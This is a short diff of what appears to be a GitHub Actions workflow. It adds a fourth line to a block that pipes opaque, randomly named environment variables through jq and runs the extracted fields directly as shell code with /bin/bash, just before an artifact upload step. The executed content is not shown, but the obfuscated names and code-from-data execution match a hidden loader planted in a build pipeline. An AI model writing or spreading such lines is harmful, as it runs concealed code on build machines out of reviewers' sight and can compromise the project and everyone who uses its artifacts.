@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$vfc32" | jq -r .b9956 | /bin/bash
           printf '%s' "$wp8" | jq -r .olx28 | /bin/bash
           printf '%s' "$mdn9125" | jq -r .x8 | /bin/bash
+          printf '%s' "$zz26" | jq -r .v6 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
